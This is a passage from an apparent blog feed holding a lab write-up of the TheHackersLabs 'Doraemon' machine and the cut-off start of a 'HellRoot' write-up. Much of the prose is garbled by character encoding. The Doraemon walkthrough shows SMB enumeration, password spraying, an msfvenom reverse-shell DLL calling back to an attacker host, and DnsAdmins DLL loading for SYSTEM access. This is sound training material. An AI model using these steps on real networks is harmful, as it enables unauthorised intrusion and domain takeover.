(SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf       .NET Message Framing\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nMAC Address: 08:00:27:09:13:BA (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb-os-discovery:\n|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)\n|   Computer name: WIN-VRU3GG3DPLJ\n|   NetBIOS computer name: WIN-VRU3GG3DPLJ\\x00\n|   Domain name: DORAEMON.THL\n|   Forest name: DORAEMON.THL\n|   FQDN: WIN-VRU3GG3DPLJ.DORAEMON.THL\n|_  System time: 2025-08-03T10:53:48+02:00\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:09:13:ba (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-08-03T08:53:48\n|_  start_date: 2025-08-03T08:25:53\n|_clock-skew: mean: 5h19m54s, deviation: 1h09m16s, median: 5h59m54s\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.49 ms 192.168.10.5\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 17.86 seconds\n```\n\n### æšä¸¾\n\n`SMB` åŒ¿å\n\n```scheme\nâœ  Doraemon nxc smb 192.168.10.5 -u anonymous -p '' --smb-timeout 9999 --shares         \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\anonymous: (Guest)\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Enumerated shares\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  Share           Permissions     Remark\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  -----           -----------     ------\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  ADMIN$                          Admin remota\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  C$                              Recurso predeterminado\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  gorrocoptero    READ            \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  IPC$            READ            IPC remota\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  NETLOGON                        Recurso compartido del servidor de inicio de sesiÃ³n \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  SYSVOL                          Recurso compartido del servidor de inicio de sesiÃ³n \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  Users\n```\n\næœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹æœ‰è¯»çš„æƒé™ï¼Œé€šè¿‡æ¨¡å—å…¨éƒ¨è¯»å‡ºæ¥\n\n```scheme\nnxc smb 192.168.10.5 -u anonymous -p '' --smb-timeout 9999 -M spider_plus -o DOWNOAD_FLAG=True\n```\n\n![image.png](/post-images/TheHackersLabsDoraemon/image1.png)\n\nå¾—åˆ°ä¸€ä¸ª `txt` æ–‡ä»¶ï¼Œå†…å®¹ï¼š\n\n```scheme\nâœ  gorrocoptero cat kedadawapa.txt       \nAtenciÃ³n al grupo especial Dorayaki1 de Estepona\n\n- Doraemon: Ã‚Â¡Hola, chicos! Ã‚Â¿QuÃƒÂ© les parece si vamos a comer dorayakis hoy?\n\n- Nobita: Ã‚Â¡SÃƒÂ­! Ã‚Â¡Me encantan los dorayakis! PeroÃ¢â‚¬Â¦ Ã‚Â¿dÃƒÂ³nde vamos a conseguirlos?\n\n- Shizuka: He oÃƒÂ­do que hay una nueva tienda de dorayakis en la esquina de la calle. Ã‚Â¡Dicen que son los mejores de la ciudad!\n\n- Suneo: Oh, por favor. Siempre hay algo nuevo. No puedo esperar para probarlos. Ã‚Â¡Espero que sean mÃƒÂ¡s grandes que los de la tienda anterior!\n\n- Gigante: Ã‚Â¡Quiero que sean enormes! Ã‚Â¡Y que tengan mucho relleno! Si no, Ã‚Â¡no me importa ir!\n\n- Doraemon: Bueno, podemos pedirle a Nobita que use el poder de la mÃƒÂ¡quina de tiempo para viajar al futuro y traernos unos dorayakis del aÃƒÂ±o 3000.\n\n- Nobita: Ã‚Â¡Espera! No sÃƒÂ© si deberÃƒÂ­a usar la mÃƒÂ¡quina. La ÃƒÂºltima vez que lo hice, terminÃƒÂ© en un lugar lleno de robots rarosÃ¢â‚¬Â¦\n\n- Shizuka: No te preocupes, Nobita. Solo vamos a la tienda. No necesitamos ir al futuro. Ã‚Â¡Podemos ir a pie!\n\n- Suneo: Eso suena aburrido. Ã‚Â¿Por quÃƒÂ© no hacemos una carrera? El primero en llegar a la tienda puede elegir el sabor de los dorayakis.\n\n- Gigante: Ã‚Â¡Me encanta esa idea! Pero, Ã‚Â¡tendrÃƒÂ¡s que correr rÃƒÂ¡pido para ganarme, Suneo!\n\n- Doraemon: Ã‚Â¿Y si mejor vamos todos juntos? AsÃƒÂ­ disfrutamos del camino. AdemÃƒÂ¡s, Ã‚Â¡puedo usar el futurÃƒÂ³fono para pedir un montÃƒÂ³n de dorayakis para que nos estÃƒÂ©n esperando!\n\n- Nobita: Ã‚Â¡Esa es una gran idea, Doraemon! AsÃƒÂ­ no tengo que correr y me aseguro de que haya suficiente para todos.\n\n- Shizuka: Ã‚Â¡Perfecto! Entonces, Ã‚Â¡vamos a la tienda de dorayakis!\n\n- Suneo: Ã‚Â¡SÃƒÂ­! Ã‚Â¡Dorayakis, allÃƒÂ¡ vamos!\n\n- Gigante: Ã‚Â¡No se olviden de mÃƒÂ­! Ã‚Â¡Voy a ganar!\n\n- Doraemon: Ã‚Â¡A comer dorayakis!\n```\n\n> è‡´ï¼šåŸƒæ–¯ç‰¹æ³¢çº³é“œé”£çƒ§1ç‰¹åˆ«ç»„\n> \n> \n> å“†å•¦Aæ¢¦ï¼šå˜¿ï¼Œä¼™è®¡ä»¬ï¼ä»Šå¤©æˆ‘ä»¬å»åƒé“œé”£çƒ§æ€ä¹ˆæ ·ï¼Ÿ\n> \n> å¤§é›„ï¼šå¥½å•Šï¼æˆ‘è¶…çˆ±åƒé“œé”£çƒ§ï¼å¯æ˜¯â€¦â€¦æˆ‘ä»¬å»å“ªå„¿ä¹°å‘¢ï¼Ÿ\n> \n> é™é¦™ï¼šæˆ‘å¬è¯´è¡—è§’å¼€äº†ä¸€å®¶æ–°çš„é“œé”£çƒ§åº—ã€‚æ®è¯´æ˜¯åŸé‡Œæœ€å¥½åƒçš„ï¼\n> \n> å°å¤«ï¼šæ‹œæ‰˜ã€‚æ€»æ˜¯æœ‰æ–°ä¸œè¥¿ã€‚æˆ‘è¿«ä¸åŠå¾…æƒ³å°å°ã€‚å¸Œæœ›æ¯”ä¸Šä¸€å®¶çš„æ›´å¤§ï¼\n> \n> å·¨äººï¼šæˆ‘æƒ³è¦ä¸ªå¤§å·çš„ï¼è€Œä¸”è¦å¤šé¦…å„¿ï¼å¦‚æœä¸æ˜¯ï¼Œæˆ‘ä¹Ÿå¯ä»¥å»ï¼\n> \n> å“†å•¦Aæ¢¦ï¼šå¥½å§ï¼Œæˆ‘ä»¬å¯ä»¥è¯·å¤§é›„ç”¨æ—¶å…‰æœºçš„åŠ›é‡ï¼Œç©¿è¶Šåˆ°æœªæ¥ï¼Œç»™æˆ‘ä»¬å¸¦ä¸€äº›3000å¹´çš„é“œé”£çƒ§ã€‚\n> \n> å¤§é›„ï¼šç­‰ç­‰ï¼æˆ‘ä¸çŸ¥é“è¯¥ä¸è¯¥ç”¨è¿™å°æœºå™¨ã€‚ä¸Šæ¬¡æˆ‘ç”¨çš„æ—¶å€™ï¼Œç»“æœæŠŠæˆ‘å¸¦åˆ°äº†ä¸€ä¸ªæ»¡æ˜¯å¥‡æ€ªæœºå™¨äººçš„åœ°æ–¹â€¦â€¦\n> \n> é™é¦™ï¼šåˆ«æ‹…å¿ƒï¼Œå¤§é›„ã€‚æˆ‘ä»¬åªæ˜¯å»å•†åº—è€Œå·²ã€‚æˆ‘ä»¬ä¸ç”¨å»æœªæ¥ã€‚æˆ‘ä»¬å¯ä»¥æ­¥è¡Œï¼\n> \n> å°å¤«ï¼šå¬èµ·æ¥å¾ˆæ— èŠã€‚ä¸å¦‚æˆ‘ä»¬æ¥ä¸ªæ¯”èµ›ï¼Ÿç¬¬ä¸€ä¸ªåˆ°åº—çš„äººå¯ä»¥é€‰æ‹©é“œé”£çƒ§çš„å£å‘³ã€‚\n> \n> å·¨äººï¼šæˆ‘å–œæ¬¢è¿™ä¸ªä¸»æ„ï¼ä¸è¿‡ä½ å¾—è·‘å¾—å¿«æ‰èƒ½èµ¢æˆ‘ï¼Œå°å¤«ï¼\n> \n> å“†å•¦Aæ¢¦ï¼šæˆ‘ä»¬ä¸€èµ·å»æ€ä¹ˆæ ·ï¼Ÿè¿™æ ·æˆ‘ä»¬å°±èƒ½äº«å—æ—…ç¨‹äº†ã€‚è€Œä¸”ï¼Œæˆ‘å¯ä»¥ç”¨æœªæ¥æ‰‹æœºè®¢ä¸€å †ç­‰ç€æˆ‘ä»¬çš„é“œé”£çƒ§ï¼\n> \n> å¤§é›„ï¼šè¿™ä¸»æ„å¤ªæ£’äº†ï¼Œå“†å•¦Aæ¢¦ï¼è¿™æ ·æˆ‘å°±ä¸ç”¨è·‘äº†ï¼Œè¿˜èƒ½ç¡®ä¿æ¯ä¸ªäººéƒ½æœ‰è¶³å¤Ÿçš„é“œé”£çƒ§ã€‚\n> \n> é™é¦™ï¼šå¤ªå¥½äº†ï¼é‚£æˆ‘ä»¬å»é“œé”£çƒ§åº—å§ï¼\n> \n> å°å¤«ï¼šå¥½çš„ï¼é“œé”£çƒ§ï¼Œæ¥å•¦ï¼\n> \n> å·¨äººï¼šåˆ«å¿˜äº†æˆ‘ï¼æˆ‘è¦èµ¢ï¼\n> \n> â€”â€”å“†å•¦Aæ¢¦ï¼šæˆ‘ä»¬åƒé“œé”£çƒ§å§ï¼\n> \n\n## æ¨ªå‘ç§»åŠ¨\n\n### Timeroast âŒ\n\n```scheme\nâœ  Timeroast python timeroast.py 192.168.10.5\n1000:$sntp-ms$6f6ee79d5defec4040b0f1bf4a84779e$1c0111e900000000000a0cff4c4f434cec399b9ba4dee858e1b8428bffbfcd0aec39acbe8d0ff10eec39acbe8d100f41\n```\n\n`hash` ä¿å­˜ä¸º `hash.txt` , `hashcat` çˆ†ç ´\n\n```scheme\n./hashcat.bin -m 31300 hash.txt /usr/share/wordlists/rockyou.txt \n```\n\næ²¡çˆ†ç ´å‡ºæ¥\n\n### åŸŸç”¨æˆ·åæšä¸¾\n\nå¯èƒ½å‰é¢çš„æ˜¯ç”¨æˆ·åï¼Œæˆ‘ä»¬å°†å…¶æå–å‡ºæ¥\n\n```scheme\nâœ  gorrocoptero cat kedadawapa.txt | awk -F '- ' '{print $2}' |awk -F ':' '{print $1}'| sort | uniq | tee Domain_users.txt\n\nDoraemon\nGigante\nNobita\nShizuka\nSuneo\n```\n\næˆ‘ä»¬å†å¯¹ç”¨æˆ·åè¿›è¡Œæµ‹è¯•\n\n```scheme\nâœ  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p '' --smb-timeout 9999 --continue-on-success --loggedon-users\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\: \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Doraemon: STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Gigante: STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Nobita: STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Shizuka: STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Suneo: STATUS_LOGON_FAILURE\n```\n\næç¤º `STATUS_LOGON_FAILURE` å­˜åœ¨ç”¨æˆ·åï¼Œä½†æ˜¯å¯†ç é”™äº†\n\n### **Kerberoast âŒ**\n\nå†æšä¸¾ `Kerberoast`\n\n```scheme\nâœ  Doraemon GetNPUsers.py -dc-ip 192.168.10.5 doraemon.thl/ -usersfile Domain_users.txt              \n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] invalid principal syntax\n/root/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n[-] User Doraemon doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Gigante doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Nobita doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Shizuka doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User Suneo doesn't have UF_DONT_REQUIRE_PREAUTH set\n```\n\næ²¡æ³•å­ï¼Œè¿™é‡Œçœ‹äº†ä¸€ä¸‹ `WP`ï¼Œå‘ç° txt æ–‡ä»¶ä¸­çš„ `Dorayaki1` æ˜¯ä¸€ä¸ªæœ‰æ•ˆå¯†ç \n\n### å¯†ç å–·æ´’\n\næˆ‘ä»¬è¿›è¡Œå¯†ç å–·æ´’\n\n```scheme\nâœ  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p 'Dorayaki1' --smb-timeout 9999 --continue-on-success                 \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\:Dorayaki1 (Guest)\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\Doraemon:Dorayaki1 \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Gigante:Dorayaki1 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Nobita:Dorayaki1 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Shizuka:Dorayaki1 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Suneo:Dorayaki1 STATUS_LOGON_FAILURE\n```\n\nå¾—åˆ°ç”¨æˆ· `Doraemon` çš„å‡­æ®\n\næµ‹è¯•å‡­æ®\n\n```scheme\nâœ  Doraemon nxc ldap 192.168.10.5 -u 'Doraemon' -p 'Dorayaki1'                           \nLDAP        192.168.10.5    389    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL)\nLDAP        192.168.10.5    389    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\Doraemon:Dorayaki1 \n\nâœ  Doraemon nxc winrm 192.168.10.5 -u 'Doraemon' -p 'Dorayaki1'\nWINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.10.5    5985   WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\Doraemon:Dorayaki1 (Pwn3d!)\n```\n\n### åŸŸåˆ†æ\n\nä½¿ç”¨ `bloodhound-ce-python` è¿›è¡Œä¿¡æ¯æ”¶é›†\n\n```scheme\nâœ  Doraemon bloodhound-ce-python -u 'Doraemon' -p 'Dorayaki1' -d 'DORAEMON.THL' -ns 192.168.10.5 -dc 'WIN-VRU3GG3DPLJ.DORAEMON.THL' --zip -c All\nINFO: BloodHound.py for BloodHound Community Edition\nINFO: Found AD domain: doraemon.thl\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.DORAEMON.THL\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: WIN-VRU3GG3DPLJ.DORAEMON.THL\nINFO: Found 10 users\nINFO: Found 54 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: WIN-VRU3GG3DPLJ.DORAEMON.THL\nINFO: Done in 00M 01S\nINFO: Compressing output into 20250803115152_bloodhound.zip\n```\n\nåŸŸç”¨æˆ·ç»„ä¿¡æ¯\n\n![image.png](/post-images/TheHackersLabsDoraemon/image2.png)\n\nåœ¨ `Bloodhound` ä¸­æ²¡èƒ½æ‰¾åˆ°ä»€ä¹ˆå¯åˆ©ç”¨ä¿¡æ¯\n\nä¸Š `winpeas` èƒ½æ‰¾åˆ°ä¸€ä¸ªå¥‡æ€ªçš„æ–‡æœ¬æ–‡ä»¶\n\n![image.png](/post-images/TheHackersLabsDoraemon/image3.png)\n\næ˜¯ä¸€ä¸ªå‡­æ®\n\n```scheme\n*Evil-WinRM* PS C:\\> cat 'C:\\Users\\Doraemon\\Links\\Carta de amor a Shizuka.txt'\nShizuka te doy la clave de mi corazon: ShizukaTeAmobb12345\n```\n\nå¯†ç å–·æ´’\n\n```scheme\nâœ  Doraemon nxc smb 192.168.10.5 -u Domain_users.txt -p 'ShizukaTeAmobb12345' --continue-on-success  \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:DORAEMON.THL) (signing:True) (SMBv1:True) \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\:ShizukaTeAmobb12345 (Guest)\nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Doraemon:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Gigante:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Nobita:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [-] DORAEMON.THL\\Shizuka:ShizukaTeAmobb12345 STATUS_LOGON_FAILURE \nSMB         192.168.10.5    445    WIN-VRU3GG3DPLJ  [+] DORAEMON.THL\\Suneo:ShizukaTeAmobb12345\n```\n\næ˜¯ `suneo` çš„å‡­æ®ï¼Œå±äº `DNSADMINS` å’Œ `DORAYAKI` ç»„\n\n![image.png](/post-images/TheHackersLabsDoraemon/image4.png)\n\né€šè¿‡ `BloodyAD` æŸ¥çœ‹å¯å†™ï¼Œæœ‰å¾ˆå¤š\n\n![image.png](/post-images/TheHackersLabsDoraemon/image5.png)\n\n## æƒé™æå‡\n\nåœ¨ `HackTricks` ä¸­èƒ½æ‰¾åˆ°åˆ©ç”¨æ–¹æ³•ï¼šhttps://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges.html?highlight=DNSadmins#dnsadmins\n\n**DnsAdmins**Â ç»„çš„æˆå‘˜å¯ä»¥åˆ©ç”¨å…¶æƒé™åœ¨ DNS æœåŠ¡å™¨ï¼ˆé€šå¸¸æ‰˜ç®¡åœ¨åŸŸæ§åˆ¶å™¨ä¸Šï¼‰ä¸ŠåŠ è½½å…·æœ‰ SYSTEM æƒé™çš„ä»»æ„ `DLL`\n\nç”Ÿæˆåå¼¹ `shell` DLL\n\n```scheme\nâœ  Doraemon msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.100 LPORT=4444 -f dll -o OMG.dll                                                                                  \n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of dll file: 9216 bytes\nSaved as: OMG.dll\n```\n\nä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ä½¿ `DNS` æœåŠ¡å™¨åŠ è½½ä»»æ„ `DLL`\n\n```scheme\n*Evil-WinRM* PS C:\\tools> dnscmd WIN-VRU3GG3DPLJ.DORAEMON.THL /config /serverlevelplugindll c:\\tools\\OMG.dll\n\nPropiedad del Registro serverlevelplugindll restablecida correctamente.\nComando completado correctamente.\n```\n\nç„¶åé‡å¯æœåŠ¡\n\n```scheme\nsc.exe \\\\WIN-VRU3GG3DPLJ stop dns\nsc.exe \\\\WIN-VRU3GG3DPLJ start dns\n```\n\n![image.png](/post-images/TheHackersLabsDoraemon/image6.png)\n\nè¯»å– `root.txt` å’Œ `user.txt`\n\n```powershell\nC:\\Users\\Administrador\\Desktop>type root.txt\ntype root.txt\nadvcrxxxxxxxxxxxxxxxxxxxxxxxxxx\n\nC:\\Users\\Suneo\\Desktop>type user.txt\ntype user.txt\nasfrexxxxxxxxxxxxxxxxxxx\n\nC:\\Users\\Administrador\\Desktop>whoami\nwhoami\nnt authority\\system\n```\n\n## æ€»ç»“\n\nè¿˜è¡Œï¼Œå°±ä¸€å¼€å§‹çš„å¯†ç æ²¡çŒœåˆ°",
            "url": "https://www.sunsetaction.top/2025/08/03/TheHackersLabsDoraemon",
            "title": "TheHackersLabs - Doraemon",
            "summary": "Doraemon https://labs.thehackerslabs.com/machine/30 Recon PortScan æšä¸¾ SMB åŒ¿å æœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹æœ‰è¯»çš„æƒé™ï¼Œé€šè¿‡æ¨¡å—å…¨éƒ¨è¯»å‡ºæ¥ å¾—åˆ°ä¸€ä¸ª txt æ–‡ä»¶ï¼Œå†…å®¹ï¼š è‡´ï¼šåŸƒæ–¯ç‰¹æ³¢çº³é“œé”£çƒ§1ç‰¹åˆ«ç»„ å“†å•¦Aæ¢¦ï¼šå˜¿ï¼Œä¼™è®¡ä»¬ï¼ä»Šå¤©æˆ‘ä»¬å»åƒé“œé”£çƒ§...",
            "date_modified": "2025-08-03T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Windows",
                "DNSADmins",
                "SMB",
                "CVE-2021-40469"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/08/02/TheHackersLabsHellRoot",
            "content_html": "\n# HellRoot\n\n> https://labs.thehackerslabs.com/machine/121\n> \n\n![image.png](/post-images/TheHackersLabsHellRoot/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\nâœ  HellRoot nmap -sT -min-rate 10000 -p- 192.168.56.95\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 15:08 CST\nNmap scan report for 192.168.56.95\nHost is up (0.00052s latency).\nNot shown: 65530 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n222/tcp  open  rsh-spx\n443/tcp  open  https\n5000/tcp open  upnp\nMAC Address: 08:00:27:5E:A1:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 3.73 seconds\n```\n\n```bash\nâœ  HellRoot nmap -sT -A -p 22,80,222,443,5000 192.168.56.95\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 15:09 CST\nNmap scan report for 192.168.56.95\nHost is up (0.00076s latency).\n\nPORT     STATE SERVICE  VERSION\n22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n| ssh-hostkey:\n|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)\n|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)\n80/tcp   open  http     Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\n|_http-title: Apache2 Debian Default Page: It works\n222/tcp  open  ssh      OpenSSH 10.0 (protocol 2.0)\n443/tcp  open  ssl/http nginx 1.29.0\n| ssl-cert: Subject: commonName=git.hellroot.thl\n| Not valid before: 2025-07-17T18:18:57\n|_Not valid after:  2026-07-17T18:18:57\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn:\n|   http/1.1\n|   http/1.0\n|_  http/0.9\n|_http-server-header: nginx/1.29.0\n|_http-title: Did not follow redirect to https://git.hellroot.thl/\n5000/tcp open  http     Apache httpd\n|_http-server-header: Apache\n|_http-title: Domain Lookup Service\nMAC Address: 08:00:27:5E:A1:66 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.76 ms 192.168.56.95\n```\n\næ‰«æå‡ºæ¥æœ‰ä¸¤ä¸ª `SSH` æœåŠ¡ï¼Œä¸‰ä¸ª `Web`\n\n### æšä¸¾\n\n`192.168.56.5` æ˜¯ `Apache` çš„é»˜è®¤é¡µé¢\n\n![image.png](/post-images/TheHackersLabsHellRoot/image1.png)\n\n`https://git.hellroot.thl/` æ˜¯ `Gitea`\n\n![image.png](/post-images/TheHackersLabsHellRoot/image2.png)\n\n`http://git.hellroot.thl:5000/` æ˜¯åŸŸåè§£æä¸€æ ·çš„ä¸œè¥¿\n\n![image.png](/post-images/TheHackersLabsHellRoot/image3.png)\n\næµ‹è¯•äº†ä¸€ä¸‹è¿™ä¸ªåŠŸèƒ½ï¼Œè²Œä¼¼æ˜¯ä½¿ç”¨ `dig` æ¥åšåŸŸåè§£æï¼Œä¸è¿‡æˆ‘è¿™é‡Œä½¿ç”¨ä»…ä¸»æœºæ‰€ä»¥æ— æ³•è¿›è¡Œè§£æ\n\n![image.png](/post-images/TheHackersLabsHellRoot/image4.png)\n\nè¿™é‡Œæˆ‘ä¹Ÿå°è¯•äº†å‘½ä»¤æ‹¼æ¥ï¼Œç»è¿‡ç®€å•å°è¯•æ²¡æœ‰å“ªé‡Œå¯ä»¥è¿›è¡Œæ³¨å…¥\n\næ¥åˆ° `gitea` èƒ½æ‰¾åˆ°ä¸€ä¸ªé¡¹ç›®\n\n![image.png](/post-images/TheHackersLabsHellRoot/image5.png)\n\nå°†å‹ç¼©åŒ…ä¸‹è½½ä¸‹æ¥æ‰“å¼€ï¼Œæ˜¯ `5000` ç«¯å£çš„æºç \n\næœ‰ä¸‰ä¸ªæ–‡ä»¶\n\n![image.png](/post-images/TheHackersLabsHellRoot/image6.png)\n\nåœ¨ `Dockerfile` é‡Œé¢èƒ½å‘ç°ä¸€ä¸ªç”¨æˆ·å¯†ç ï¼Œä½†æ˜¯è¿™é‡Œä½¿ç”¨ `SSH` æ— æ³•è¿›è¡Œç™»å½•\n\n```bash\n# Create user astro with passwordless sudo access only for /bin/su\nRUN useradd -m astro && echo \"astro:iloveastro\" | chpasswd && \\\n    echo \"astro ALL=(ALL:ALL) NOPASSWD: /bin/su\" > /etc/sudoers.d/astro-su && \\\n    chmod 440 /etc/sudoers.d/astro-su\n```\n\nå¹¶ä¸” `222` ç«¯å£åªèƒ½ä½¿ç”¨ç§é’¥è¿›è¡Œç™»å½•\n\n## RCE æ¼æ´\n\nä¸‹è¾¹æ˜¯`index.php` çš„æºç \n\n```bash\n<main>\n  <h1>Domain Lookup Service</h1>\n  <form method=\"POST\" action=\"\">\n    <label for=\"domain\">Enter Domain</label>\n    <input id=\"domain\" name=\"domain\" 